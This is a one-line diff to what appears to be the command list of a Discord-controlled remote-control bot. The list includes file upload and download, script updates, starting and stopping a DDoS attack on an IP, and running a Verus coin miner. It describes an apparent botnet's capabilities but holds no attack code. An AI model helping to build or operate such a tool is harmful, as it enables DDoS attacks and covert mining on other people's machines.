@@ -19,7 +19,7 @@
 * !download < link >              # Upload file to Discord
 * !upload < link > < file_name >  # Download file
 * !sh-update < link >             # Update linux script
-* !win-update < link >            # Update windows script
+* !win-update                     # Update windows script
 * !ddos < ip >                    # Start DDoS Attack
 * !stopddos                       # Stop DDoS Attack
 * !miner < wallet >               # Start Verus coin miner
